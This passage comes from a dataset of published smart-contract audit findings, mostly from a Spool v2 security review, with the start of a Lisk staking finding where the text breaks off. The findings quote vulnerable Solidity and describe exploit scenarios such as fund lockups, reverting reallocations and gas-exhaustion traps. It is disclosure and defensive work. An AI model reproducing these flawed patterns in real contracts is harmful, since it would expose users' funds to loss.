amounts array but uses an additional element to keep track of whether deposits need to be made in the Strategy.doHardWork function. As a result, _addLiquidity overwrites the number of tokens to send for the rst asset, causing far fewer tokens to be deposited than expected, thus causing the transaction to revert due to the slippage check. function _addLiquidity( uint256 [] memory amounts, uint256 slippage) internal { uint256 [N_COINS] memory curveAmounts; for ( uint256 i; i < amounts.length; ++i) { curveAmounts[assetMapping().get(i)] = amounts[i]; } ICurve3CoinPool(pool()).add_liquidity(curveAmounts, slippage); } Figure 25.1: The _addLiquidity function in spool-v2-core/CurveAdapter.sol#L12L20 The last element in the doHardWork functions assetsToDeposit array keeps track of the deposits to be made and is incremented by one on each iteration of assets in assetGroup if that asset has tokens to deposit. This variable is then passed to the _depositToProtocol function and then, for strategies that use the Curve3CoinPoolAdapter , is passed to _addLiquidity in the amounts parameter. When _addLiquidity iterates over the last element in the amounts array, the assetMapping().get(i) function will return 0 because i in assetMapping is uninitialized. This return value will overwrite the number of tokens to deposit for the rst asset with a strictly smaller amount. function doHardWork(StrategyDhwParameterBag calldata dhwParams) external returns (DhwInfo memory dhwInfo) { _checkRole(ROLE_STRATEGY_REGISTRY, msg.sender ); // assetsToDeposit[0..token.length-1]: amount of asset i to deposit // assetsToDeposit[token.length]: is there anything to deposit uint256 [] memory assetsToDeposit = new uint256 [](dhwParams.assetGroup.length + 1); unchecked { for ( uint256 i; i < dhwParams.assetGroup.length; ++i) { assetsToDeposit[i] = IERC20(dhwParams.assetGroup[i]).balanceOf(address(this)); if (assetsToDeposit[i] > 0) { ++assetsToDeposit[dhwParams.assetGroup.length]; } } } [...] // - deposit assets into the protocol _depositToProtocol(dhwParams.assetGroup, assetsToDeposit, dhwParams.slippages); Figure 25.2: A snippet of the doHardWork function in spool-v2-core/Strategy.sol#L71L85 Exploit Scenario The doHardWork function is called for a smart vault that uses the ConvexAlusdStrategy strategy; however, the subsequent call to _addLiquidity reverts due to the incorrect number of assets that it is trying to deposit. The smart vault is unusable. Recommendations Short term, have _addLiquidity loop the amounts array for N_COINS time instead of its length. Long term, refactor the Strategy.doHardWork function so that it does not use an additional element in the assetsToDeposit array to keep track of whether deposits need to be made. Instead, use a separate Boolean variable. The current pattern is too error-prone.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Low"]}, {"title": "26. Reallocation process reverts when a ghost strategy is present ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-spool-platformv2-securityreview.pdf", "body": "The reallocation process reverts in multiple places when a ghost strategy is present. As a result, it is impossible to reallocate a smart vault with a ghost strategy. The rst revert would occur in the mapStrategies function (gure 26.1). Users calling the reallocate function would not know to add the ghost strategy address in the strategies array, which holds the strategies that need to be reallocated. This function reverts if it does not nd a strategy in the array. Even if the ghost strategy address is in strategies , a revert would occur in the areas described below. function mapStrategies( address [] calldata smartVaults, address [] calldata strategies, mapping ( address => address []) storage _smartVaultStrategies ) private view returns ( uint256 [][] memory ) { [...] // Loop over smart vault's strategies. for ( uint256 j; j < smartVaultStrategiesLength; ++j) { address strategy = smartVaultStrategies[j]; bool found = false ; // Try to find the strategy in the provided list of strategies. for ( uint256 k; k < strategies.length; ++k) { if (strategies[k] == strategy) { // Match found. found = true ; strategyMatched[k] = true ; // Add entry to the strategy mapping. strategyMapping[i][j] = k; break ; } } if (!found) { list // If a smart vault's strategy was not found in the provided // of strategies, this means that the provided list is invalid. revert InvalidStrategies(); } } } Figure 26.1: A snippet of the mapStrategies function in spool-v2-core/ReallocationLib.sol#L86L144 During the reallocation process, the doReallocation function calls the beforeRedeemalCheck and beforeDepositCheck functions even on ghost strategies (gure 26.2); however, their implementation is to revert on ghost strategies with an IsGhostStrategy error (gure 26.3) . function doReallocation( address [] calldata strategies, ReallocationParameterBag calldata reallocationParams, uint256 [][][] memory reallocationTable ) private { if (totals[0] == 0) { reallocationParams.withdrawalSlippages[i]); IStrategy(strategies[i]).beforeRedeemalCheck(0, // There is nothing to withdraw from strategy i. continue ; } // Calculate amount of shares to redeem and to distribute. uint256 sharesToDistribute = // first store here total amount of shares that should have been withdrawn IStrategy(strategies[i]).totalUsdValue(); IStrategy(strategies[i]).totalSupply() * totals[0] / IStrategy(strategies[i]).beforeRedeemalCheck( sharesToDistribute, reallocationParams.withdrawalSlippages[i] ); [...] // Deposit assets into the underlying protocols. for ( uint256 i; i < strategies.length; ++i) { IStrategy(strategies[i]).beforeDepositCheck(toDeposit[i], reallocationParams.depositSlippages[i]); [...] Figure 26.2: A snippet of the doReallocation function in spool-v2-core/ReallocationLib.sol#L285L469 contract GhostStrategy is IERC20Upgradeable, IStrategy { [...] function beforeDepositCheck( uint256 [] memory , uint256 [] calldata ) external pure { revert IsGhostStrategy(); } function beforeRedeemalCheck( uint256 , uint256 [] calldata ) external pure { revert IsGhostStrategy(); } Figure 26.3: The beforeDepositCheck and beforeRedeemalCheck functions in spool-v2-core/GhostStrategy.sol#L98L104 Exploit Scenario A strategy is removed from a smart vault. Bob, who has the ROLE_ALLOCATOR role, calls reallocate , but it reverts and the smart vault is impossible to reallocate. Recommendations Short term, modify the associated code so that ghost strategies are not passed to the reallocate function in the _smartVaultStrategies parameter. Long term, improve the systems unit and integration tests to test for smart vaults with ghost strategies. Such tests are currently missing.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "27. Broken test cases that hide security issues ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-spool-platformv2-securityreview.pdf", "body": "Multiple test cases do not check sucient conditions to verify the correctness of the code, which could result in the deployment of buggy code in production and the loss of funds. The test_extendRewardEmission_ok test does not check the new reward rate and duration to verify the eect of the call to the extendRewardEmission function on the RewardManager contract: function test_extendRewardEmission_ok() public { deal(address(rewardToken), vaultOwner, rewardAmount * 2, true); vm.startPrank(vaultOwner); rewardToken.approve(address(rewardManager), rewardAmount * 2); rewardManager.addToken(smartVault, rewardToken, rewardDuration, rewardAmount); rewardManager.extendRewardEmission(smartVault, rewardToken, 1 ether, rewardDuration); vm.stopPrank(); } Figure 27.1: An insucient test case for extendRewardEmission spool-v2-core/RewardManager.t.sol The test_removeReward_ok test does not check the new reward token count and the deletion of the reward conguration for the smart vault to verify the eect of the call to the removeReward function on the RewardManager contract: function test_removeReward_ok() public { deal(address(rewardToken), vaultOwner, rewardAmount, true); vm.startPrank(vaultOwner); rewardToken.approve(address(rewardManager), rewardAmount); rewardManager.addToken(smartVault, rewardToken, rewardDuration, rewardAmount); skip(rewardDuration + 1); rewardManager.removeReward(smartVault, rewardToken); vm.stopPrank(); } Figure 27.2: An insucient test case for removeReward spool-v2-core/RewardManager.t.sol There is no test case to check the access controls of the removeReward function. Similarly, the test_forceRemoveReward_ok test does not check the eects of the forced removal of a reward token. Findings TOB-SPL-28 and TOB-SPL-29 were not detected by tests because of these broken test cases. The test_removeStrategy_betweenFlushAndDHW test does not check the balance of the master wallet. The test_removeStrategy_betweenFlushAndDhwWithdrawals test removes the strategy before the do hard work execution of the deposit cycle instead of removing it before the do hard work execution of the withdrawal cycle, making this test case redundant. Finding TOB-SPL-33 would have been detected if this test had been correctly implemented. There may be other broken tests that we did not nd, as we could not cover all of the test cases. Exploit Scenario The Spool team deploys the protocol. After some time, the Spool team makes some changes in the code that introduces a bug that goes unnoticed due to the broken test cases. The team deploys the new changes with condence in their tests and ends up introducing a security issue in the production deployment of the protocol. Recommendations Short term, x the test cases described above. Long term, review all of the systems test cases and make sure that they verify the given state change correctly and suciently after an interaction with the protocol. Use Necessist to nd broken test cases and x them.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Undetermined"]}, {"title": "28. Reward emission can be extended for a removed reward token ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-spool-platformv2-securityreview.pdf", "body": "Smart vault owners can extend the reward emission for a removed token, which may cause tokens to be stuck in the RewardManager contract. The removeReward function in the RewardManager contract calls the _removeReward function, which does not remove the reward conguration: function _removeReward( address smartVault, IERC20 token) private { uint256 _rewardTokensCount = rewardTokensCount[smartVault]; for ( uint256 i; i < _rewardTokensCount; ++i) { if (rewardTokens[smartVault][i] == token) { rewardTokens[smartVault][i] = rewardTokens[smartVault][_rewardTokensCount - 1]; delete rewardTokens[smartVault][_rewardTokensCount- 1]; rewardTokensCount[smartVault]--; emit RewardRemoved(smartVault, token); break ; } } } Figure 28.1: The _removeReward function in spool-v2-core/RewardManger.sol The extendRewardEmission function checks whether the value of tokenAdded in the rewardConfiguration[smartVault][token] conguration is not zero to make sure that the token was already added to the smart vault: function extendRewardEmission( address smartVault, IERC20 token, uint256 reward, uint32 rewardsDuration) external onlyAdminOrVaultAdmin(smartVault, msg.sender ) exceptUnderlying(smartVault, token) { if (tokenBlacklist[smartVault][token]) revert RewardTokenBlacklisted(address(token)); if (rewardsDuration == 0) revert InvalidRewardDuration(); if (rewardConfiguration[smartVault][token].tokenAdded == 0) { revert InvalidRewardToken(address(token)); } rewardConfiguration[smartVault][token].rewardsDuration = rewardsDuration; _extendRewardEmission(smartVault, token, reward); } Figure 28.2: The extendRewardEmission function in spool-v2-core/RewardManger.sol After removing a reward token from a smart vault, the value of tokenAdded in the rewardConfiguration[smartVault][token] conguration is left as nonzero, which allows the smart vault owner to extend the reward emission for the removed token. Exploit Scenario Alice adds a reward token A to her smart vault S. After a month, she removes token A from her smart vault. After some time, she forgets that she removed token A from her vault. She calls extendRewardEmission with 1,000 token A as the reward. The amount of token A is transferred from Alice to the RewardManager contract, but it is not distributed to the users because it is not present in the list of reward tokens added for smart vault S. The 1,000 tokens are stuck in the RewardManager contract. Recommendations Short term, modify the associated code so that it deletes the rewardConfiguration[smartVault][token] conguration when removing a reward token for a smart vault. Long term, add test cases to check for expected user interactions to catch bugs such as this.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Medium"]}, {"title": "29. A reward token cannot be added once it is removed from a smart vault ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-spool-platformv2-securityreview.pdf", "body": "Smart vault owners cannot add reward tokens again after they have been removed once from the smart vault, making owners incapable of providing incentives to users. The removeReward function in the RewardManager contract calls the _removeReward function, which does not remove the reward conguration: function _removeReward( address smartVault, IERC20 token) private { uint256 _rewardTokensCount = rewardTokensCount[smartVault]; for ( uint256 i; i < _rewardTokensCount; ++i) { if (rewardTokens[smartVault][i] == token) { rewardTokens[smartVault][i] = rewardTokens[smartVault][_rewardTokensCount - 1]; delete rewardTokens[smartVault][_rewardTokensCount- 1]; rewardTokensCount[smartVault]--; emit RewardRemoved(smartVault, token); break ; } } } Figure 29.1: The _removeReward function in spool-v2-core/RewardManger.sol The addToken function checks whether the value of tokenAdded in the rewardConfiguration[smartVault][token] conguration is zero to make sure that the token was not already added to the smart vault: function addToken( address smartVault, IERC20 token, uint32 rewardsDuration, uint256 reward) external onlyAdminOrVaultAdmin(smartVault, msg.sender ) exceptUnderlying(smartVault, token) { RewardConfiguration storage config = rewardConfiguration[smartVault][token]; if (tokenBlacklist[smartVault][token]) revert RewardTokenBlacklisted(address(token)); if (config.tokenAdded != 0) revert RewardTokenAlreadyAdded(address(token)); if (rewardsDuration == 0) revert InvalidRewardDuration(); if (rewardTokensCount[smartVault] > 5) revert RewardTokenCapReached(); rewardTokens[smartVault][rewardTokensCount[smartVault]] = token; rewardTokensCount[smartVault]++; config.rewardsDuration = rewardsDuration; if (reward > 0) { _extendRewardEmission(smartVault, token, reward); } } Figure 29.2: The addToken function in spool-v2-core/RewardManger.sol After a reward token is removed from a smart vault, the value of tokenAdded in the rewardConfiguration[smartVault][token] conguration is left as nonzero, which prevents the smart vault owner from adding the token again for reward distribution as an incentive to the users of the smart vault. Exploit Scenario Alice adds a reward token A to her smart vault S. After a month, she removes token A from her smart vault. Noticing the success of her earlier reward incentive program, she wants to add reward token A to her smart vault again, but her transaction to add the reward token reverts, leaving her with no choice but to distribute another token. Recommendations Short term, modify the associated code so that it deletes the rewardConfiguration[smartVault][token] conguration when removing a reward token for a smart vault. Long term, add test cases to check for expected user interactions to catch bugs such as this.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Low"]}, {"title": "30. Missing whenNotPaused modier ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-spool-platformv2-securityreview.pdf", "body": "The documentation species which functionalities should not be working when the system is paused, including the claiming of rewards; however, the claim function does not have the whenNotPaused modier. As a result, users can claim their rewards even when the system is paused. If the system is paused: - users cant claim vault incentives - [...] Figure 30.1: A snippet of the provided Spool documentation function claim(ClaimRequest[] calldata data) public { Figure 30.2: The claim function header in spool-v2-core/RewardPool.sol#L47 Exploit Scenario Alice, who has the ROLE_PAUSER role in the system, pauses the protocol after she sees a possible vulnerability in the claim function. The Spool team believes there are no possible funds moving from the system; however, users can still claim their rewards. Recommendations Short term, add the whenNotPaused modier to the claim function. Long term, improve the systems unit and integration tests by adding a test to verify that the expected functionalities do not work when the system is in a paused state.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Low"]}, {"title": "31. Users who deposit and then withdraw before doHardWork lose their tokens ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-spool-platformv2-securityreview.pdf", "body": "Users who deposit and then withdraw assets before doHardWork is called will receive zero tokens from their withdrawal operations. When a user deposits assets, the depositAssets function mints an NFT with some metadata to the user who can later redeem it for the underlying SVT tokens. function depositAssets(DepositBag calldata bag, DepositExtras calldata bag2) external onlyRole(ROLE_SMART_VAULT_MANAGER, msg.sender) returns ( uint256 [] memory , uint256 ) { [...] // mint deposit NFT DepositMetadata memory metadata = DepositMetadata(bag.assets, block.timestamp , bag2.flushIndex); uint256 depositId = ISmartVault(bag.smartVault).mintDepositNFT(bag.receiver, metadata); [...] } Figure 31.1: A snippet of the depositAssets function in spool-v2-core/DepositManager.sol#L379L439 Users call the claimSmartVaultTokens function in the SmartVaultManager contract to claim SVT tokens. It is important to note that this function calls the _syncSmartVault function with false as the last argument, which means that it will not revert if the current ush index and the ush index to sync are the same. Then, claimSmartVaultTokens delegates the work to the corresponding function in the DepositManager contract. function claimSmartVaultTokens( address smartVault, uint256 [] calldata nftIds, uint256 [] calldata nftAmounts) public whenNotPaused returns ( uint256 ) { _onlyRegisteredSmartVault(smartVault); address [] memory tokens = _assetGroupRegistry.listAssetGroup(_smartVaultAssetGroups[smartVault]); _syncSmartVault(smartVault, _smartVaultStrategies[smartVault], tokens, false ); return _depositManager.claimSmartVaultTokens(smartVault, nftIds, nftAmounts, tokens, msg.sender ); } Figure 31.2: A snippet of the claimSmartVaultTokens function in spool-v2-core/SmartVaultManager.sol#L238L247 Later, the claimSmartVaultTokens function in DepositManager (gure 31.3) computes the SVT tokens that users will receive by calling the getClaimedVaultTokensPreview function and passing the bag.mintedSVTs value for the ush corresponding to the burned NFT. function claimSmartVaultTokens( address smartVault, uint256 [] calldata nftIds, uint256 [] calldata nftAmounts, address [] calldata tokens, address executor ) external returns ( uint256 ) { _checkRole(ROLE_SMART_VAULT_MANAGER, msg.sender ); [...] ClaimTokensLocalBag memory bag; ISmartVault vault = ISmartVault(smartVault); bag.metadata = vault.burnNFTs(executor, nftIds, nftAmounts); for ( uint256 i; i < nftIds.length; ++i) { if (nftIds[i] > MAXIMAL_DEPOSIT_ID) { revert InvalidDepositNftId(nftIds[i]); } // we can pass empty strategy array and empty DHW index array, // because vault should already be synced and mintedVaultShares values available bag.data = abi.decode(bag.metadata[i], (DepositMetadata)); bag.mintedSVTs = _flushShares[smartVault][bag.data.flushIndex].mintedVaultShares; claimedVaultTokens += getClaimedVaultTokensPreview(smartVault, bag.data, nftAmounts[i], bag.mintedSVTs , tokens); } Figure 31.3: A snippet of the claimSmartVaultTokens in spool-v2-core/DepositManager.sol#L135L184 Then, getClaimedVaultTokensPreview calculates the SVT tokens proportional to the amount deposited. function getClaimedVaultTokensPreview( address smartVaultAddress, DepositMetadata memory data, uint256 nftShares, uint256 mintedSVTs, address [] calldata tokens ) public view returns ( uint256 ) { [...] for ( uint256 i; i < data.assets.length; ++i) { depositedUsd += _priceFeedManager.assetToUsdCustomPrice(tokens[i], data.assets[i], exchangeRates[i]); totalDepositedUsd += totalDepositedAssets[i], exchangeRates[i]); _priceFeedManager.assetToUsdCustomPrice(tokens[i], } uint256 claimedVaultTokens = mintedSVTs * depositedUsd / totalDepositedUsd; return claimedVaultTokens * nftShares / NFT_MINTED_SHARES; } Figure 31.4: A snippet of the getClaimedVaultTokensPreview function in spool-v2-core/DepositManager.sol#L546L572 However, the value of _flushShares[smartVault][bag.data.flushIndex].mintedVaultShares , shown in gure 31.3, will always be 0 : the value is updated in the syncDeposit function, but because the current ush cycle is not nished yet, syncDeposit cannot be called through syncSmartVault . The same problem appears in the redeem , redeemFast , and claimWithdrawal functions. Exploit Scenario Bob deposits assets into a smart vault, but he notices that he deposited in the wrong smart vault. He calls redeem and claimWithdrawal , expecting to receive back his tokens, but he receives zero tokens. The tokens are locked in the smart contracts. Recommendations Short term, do not allow users to withdraw tokens when the corresponding ush has not yet happened. Long term, document and test the expected eects when calling functions in all of the possible orders, and add adequate constraints to avoid unexpected behavior.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Low"]}, {"title": "32. Lack of events emitted for state-changing functions ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-spool-platformv2-securityreview.pdf", "body": "Multiple critical operations do not emit events. As a result, it will be dicult to review the correct behavior of the contracts once they have been deployed. Events generated during contract execution aid in monitoring, baselining of behavior, and detection of suspicious activity. Without events, users and blockchain-monitoring systems cannot easily detect behavior that falls outside the baseline conditions. This may prevent malfunctioning contracts or attacks from being detected. The following operations should trigger events:  SpoolAccessControl.grantSmartVaultOwnership  ActionManager.setActions  SmartVaultManager.registerSmartVault  SmartVaultManager.removeStrategy  SmartVaultManager.syncSmartVault  SmartVaultManager.reallocate  StrategyRegistry.registerStrategy  StrategyRegistry.removeStrategy  StrategyRegistry.doHardWork  StrategyRegistry.setEcosystemFee  StrategyRegistry.setEcosystemFeeReceiver  StrategyRegistry.setTreasuryFee  StrategyRegistry.setTreasuryFeeReceiver  Strategy.doHardWork  RewardManager.addToken  RewardManager.extendRewardEmission Exploit Scenario The Spool system experiences a security incident, but the Spool team has trouble reconstructing the sequence of events causing the incident because of missing log information. Recommendations Short term, add events for all operations that may contribute to a higher level of monitoring and alerting. Long term, consider using a blockchain-monitoring system to track any suspicious behavior in the contracts. The system relies on several contracts to behave as expected. A monitoring mechanism for critical events would quickly detect any compromised system components.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "33. Removal of a strategy could result in loss of funds ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-spool-platformv2-securityreview.pdf", "body": "A Spool admin can remove a strategy from the system, which will be replaced by a ghost strategy in all smart vaults that use it; however, if a strategy is removed when the system is in specic states, funds to be deposited or withdrawn in the next do hard work cycle will be lost. If the following sequence of events occurs, the asset deposited will be lost from the removed strategy: 1. A user deposits assets into a smart vault. 2. The ush function is called. The StrategyRegistry._assetsDeposited[strategy][xxx][yyy] storage variable now has assets to send to the given strategy in the next do hard work cycle. 3. The strategy is removed. 4. doHardWork is called, but the assets for the removed strategy are locked in the master wallet because the function can be called only for valid strategies. If the following sequence of events occurs, the assets withdrawn from a removed strategy will be lost: 1. doHardWork is called. 2. The strategy is removed before a smart vault sync is done. Exploit Scenario Multiple smart vaults use strategy A. Users deposited a total of $1 million, and $300,000 should go to strategy A. Strategy A is removed due to an issue in the third-party protocol. All of the $300,000 is locked in the master wallet. Recommendations Short term, modify the associated code to properly handle deposited and withdrawn funds when strategies are removed. Long term, improve the systems unit and integration tests: consider all of the possible transaction sequences in the systems state and test them to ensure their correct behavior.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Medium"]}, {"title": "34. ExponentialAllocationProvider reverts on strategies without risk scores ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-spool-platformv2-securityreview.pdf", "body": "The ExponentialAllocationProvider.calculateAllocation function can revert due to division-by-zero error when a strategys risk score has not been set by the risk provider. The risk variable in calculateAllocation represents the risk score set by the risk provider for the given strategy, represented by the index i . Ghost strategies can be passed to the function. If a ghost strategys risk score has not been set (which is likely, as there would be no reason to set one), the function will revert with a division-by-zero error. function calculateAllocation(AllocationCalculationInput calldata data) external pure returns ( uint256 [] memory ) { if (data.apys.length != data.riskScores.length) { revert ApysOrRiskScoresLengthMismatch(data.apys.length, data.riskScores.length); } [...] for ( uint8 i; i < data.apys.length; ++i) { [...] int256 risk = fromUint(data.riskScores[i]); results[i] = uint256 ( div(apy, risk) ); resultSum += results[i]; } Figure 34.1: A snippet of the calculateAllocation function in spool-v2-core/ExponentialAllocationProvider.sol#L309L340 Exploit Scenario A strategy is removed from a smart vault that uses the ExponentialAllocationProvider contract. Bob, who has the ROLE_ALLOCATOR role, calls reallocate ; however, it reverts, and the smart vault is impossible to reallocate. Recommendations Short term, modify the calculateAllocation function so that it properly handles strategies with uninitialized risk scores. Long term, improve the unit and integration tests for the allocators. Refactor the codebase so that ghost strategies are not passed to the calculateAllocator function.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Medium"]}, {"title": "35. Removing a strategy makes the smart vault unusable ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-spool-platformv2-securityreview.pdf", "body": "Removing a strategy from a smart vault causes every subsequent deposit transaction to revert, making the smart vault unusable. The deposit function of the SmartVaultManager contract calls the depositAssets function on the DepositManager contract. The depositAssets function calls the checkDepositRatio function, which takes an argument called strategyRatios : function depositAssets(DepositBag calldata bag, DepositExtras calldata bag2) external onlyRole(ROLE_SMART_VAULT_MANAGER, msg.sender ) returns ( uint256 [] memory , uint256 ) { ... // check if assets are in correct ratio checkDepositRatio( bag.assets, SpoolUtils.getExchangeRates(bag2.tokens, _priceFeedManager), bag2.allocations, SpoolUtils.getStrategyRatiosAtLastDhw(bag2.strategies, _strategyRegistry) ); ... return (_vaultDeposits[bag.smartVault][bag2.flushIndex].toArray(bag2.tokens.length), depositId); } Figure 35.1: The depositAssets function in spool-v2-core/DepositManager.sol The value of strategyRatios is fetched from the StrategyRegistry contract, which returns an empty array on ghost strategies. This empty array is then used in a for loop in the calculateFlushFactors function: function calculateFlushFactors( uint256 [] memory exchangeRates, uint16a16 allocation, uint256 [][] memory strategyRatios ) public pure returns ( uint256 [][] memory ) { uint256 [][] memory flushFactors = new uint256 [][](strategyRatios.length); // loop over strategies for ( uint256 i; i < strategyRatios.length; ++i) { flushFactors[i] = new uint256 [](exchangeRates.length); uint256 normalization = 0; // loop over assets for ( uint256 j = 0; j < exchangeRates.length; j++) { normalization += strategyRatios[i][j] * exchangeRates[j]; } // loop over assets for ( uint256 j = 0; j < exchangeRates.length; j++) { flushFactors[i][j] = allocation.get(i) * strategyRatios[i][j] * PRECISION_MULTIPLIER / normalization; } } return flushFactors; } Figure 35.2: The calculateFlushFactors function in spool-v2-core/DepositManager.sol The statement calculating the value of normalization tries to access an index of the empty array and reverts with the Index out of bounds error, causing the deposit function to revert for every transaction thereafter. Exploit Scenario A Spool admin removes a strategy from a smart vault. Because of the presence of a ghost strategy, users deposit transactions into the smart vault revert with the Index out of bounds error. Recommendations Short term, modify the calculateFlushFactors function so that it skips ghost strategies in the loop used to calculate the value of normalization . Long term, review the entire codebase, check the eects of removing strategies from smart vaults, and ensure that all of the functionality works for smart vaults with one or more ghost strategies.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "36. Issues with the management of access control roles in deployment script ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-spool-platformv2-securityreview.pdf", "body": "The deployment script does not properly manage or assign access control roles. As a result, the protocol will not work as expected, and the protocols contracts cannot be upgraded. The deployment script has multiple issues regarding the assignment or transfer of access control roles. It fails to grant certain roles and to revoke temporary roles on deployment:      Ownership of the ProxyAdmin contract is not transferred to an EOA, multisig wallet, or DAO after the system is deployed, making the smart contracts non-upgradeable. The DEFAULT_ADMIN_ROLE role is not transferred to an EOA, multisig wallet, or DAO after the system is deployed, leaving no way to manage roles after deployment. The ADMIN_ROLE_STRATEGY role is not assigned to the StrategyRegistry contract, which is required to grant the ROLE_STRATEGY role to a strategy contract. Because of this, new strategies cannot be registered. The ADMIN_ROLE_SMART_VAULT_ALLOW_REDEEM role is not assigned to the SmartVaultFactory contract, which is required to grant the ROLE_SMART_VAULT_ALLOW_REDEEM role to smartVault contracts. The ROLE_SMART_VAULT_MANAGER and ROLE_MASTER_WALLET_MANAGER roles are not assigned to the DepositManager and WithdrawalManager contracts, making them unable to move funds from the master wallet contract. We also found that the ROLE_SMART_VAULT_ADMIN role is not assigned to the smart vault owner when a new smart vault is created. This means that smart vault owners will not be able to manage their smart vaults. Exploit Scenario The Spool team deploys the smart contracts using the deployment script, but due to the issues described in this nding, the team is not able to perform the role management and upgrades when required. Recommendations Short term, modify the deployment script so that it does the following on deployment:     Transfers ownership of the proxyAdmin contract to an EOA, multisig wallet, or DAO Transfers the DEFAULT_ADMIN_ROLE role to an EOA, multisig wallet, or DAO Grants the required roles to the smart contracts Allow the SmartVaultFactory contract to grant the ROLE_SMART_VAULT_ADMIN role to owners of newly created smart vaults Long term, document all of the systems roles and interactions between components that require privileged roles. Make sure that all of the components are granted their required roles following the principle of least privilege to keep the protocol secure and functioning as expected.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Low"]}, {"title": "37. Risk of DoS due to unbounded loops ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-spool-platformv2-securityreview.pdf", "body": "Guards and actions are run in unbounded loops. A smart vault creator can add too many guards and actions, potentially trapping the deposit and withdrawal functionality due to a lack of gas. The runGuards function calls all the congured guard contracts in a loop: function runGuards( address smartVaultId, RequestContext calldata context) external view { if (guardPointer[smartVaultId][context.requestType] == address (0)) { return ; } GuardDefinition[] memory guards = _readGuards(smartVaultId, context.requestType); for ( uint256 i; i < guards.length; ++i) { GuardDefinition memory guard = guards[i]; bytes memory encoded = _encodeFunctionCall(smartVaultId, guard, context); ( bool success, bytes memory data) = guard.contractAddress.staticcall(encoded); _checkResult(success, data, guard.operator, guard.expectedValue, i); } } Figure 37.1: The runGuards function in spool-v2-core/GuardManager.sol Multiple conditions can cause this loop to run out of gas:    The vault creator adds too many guards. One of the guard contracts consumes a high amount of gas. A guard starts consuming a high amount of gas after a specic block or at a specic state. If user transactions reach out-of-gas errors due to these conditions, smart vaults can become unusable, and funds can become stuck in the protocol. A similar issue aects the runActions function in the AuctionManager contract. Exploit Scenario Eve creates a smart vault with an upgradeable guard contract. Later, when users have made large deposits, Eve upgrades the guard contract to consume all of the available gas to trap user deposits in the smart vault for as long as she wants. Recommendations Short term, model all of the system's variable-length loops, including the ones used by runGuards and runActions , to ensure they cannot block contract execution within expected system parameters. Long term, carefully audit operations that consume a large amount of gas, especially those in loops.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "38. Unsafe casts throughout the codebase ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-spool-platformv2-securityreview.pdf", "body": "The codebase contains unsafe casts that could cause mathematical errors if they are reachable in certain states. Examples of possible unsafe casts are shown in gures 38.1 and 38.2. function flushSmartVault( address smartVault, uint256 flushIndex, address [] calldata strategies, uint16a16 allocation, address [] calldata tokens ) external returns (uint16a16) { [...] _flushShares[smartVault][flushIndex].flushSvtSupply = uint128(ISmartVault(smartVault).totalSupply()) ; return _strategyRegistry.addDeposits(strategies, distribution); } Figure 38.1: A possible unsafe cast in spool-v2-core/DepositManager.sol#L220 function syncDeposits( address smartVault, uint256 [3] calldata bag, // uint256 flushIndex, // uint256 lastDhwSyncedTimestamp, // uint256 oldTotalSVTs, address [] calldata strategies, uint16a16[2] calldata dhwIndexes, address [] calldata assetGroup, SmartVaultFees calldata fees ) external returns (DepositSyncResult memory ) { [...] if (syncResult.mintedSVTs > 0) { _flushShares[smartVault][bag[0]].mintedVaultShares = uint128 (syncResult.mintedSVTs) ; [...] } return syncResult; } Figure 38.2: A possible unsafe cast in spool-v2-core/DepositManager.sol#L243 Recommendations Short term, review the codebase to identify all of the casts that may be unsafe. Analyze whether these casts could be a problem in the current codebase and, if they are unsafe, make the necessary changes to make them safe. Long term, when implementing potentially unsafe casts, always include comments to explain why those casts are safe in the context of the codebase.", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: Undetermined"]}, {"title": "1. Users can bypass the minimum lock duration ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-lisksmartcontracts-securityreview.pdf", "body": "Users can bypass the 14-day minimum lock duration by depositing a small amount of LSK tokens, initiating a fast unlock of their positions, and then depositing more tokens. The L2Staking contract allows users to initiate a fast unlock of their positions in order to be able to withdraw their locked LSK tokens early (gure 1.1). This action charges a penalty to the user proportional to their locked amount and the remaining lock duration, and sets the positions lock duration to three days (gure 1.2). function initiateFastUnlock(uint256 lockId) public virtual returns (uint256) { IL2LockingPosition.LockingPosition memory lock = (IL2LockingPosition(lockingPositionContract)).getLockingPosition(lockId); require(isLockingPositionNull(lock) == false, \"L2Staking: locking position does not exist\"); require(canLockingPositionBeModified(lockId, lock), \"L2Staking: only owner or creator can call this function\"); require(remainingLockingDuration(lock) > FAST_UNLOCK_DURATION, \"L2Staking: less than 3 days until unlock\"); // calculate penalty uint256 penalty = calculatePenalty(lock.amount, remainingLockingDuration(lock)); uint256 amount = lock.amount - penalty; uint256 expDate = todayDay() + FAST_UNLOCK_DURATION; // update locking position (IL2LockingPosition(lockingPositionContract)).modifyLockingPosition(lockId, amount, expDate, 0); if (lock.creator == address(this)) { // send penalty amount to the Lisk DAO Treasury contract bool success = IERC20(l2LiskTokenContract).transfer(daoTreasury, penalty); require(success, \"L2Staking: LSK token 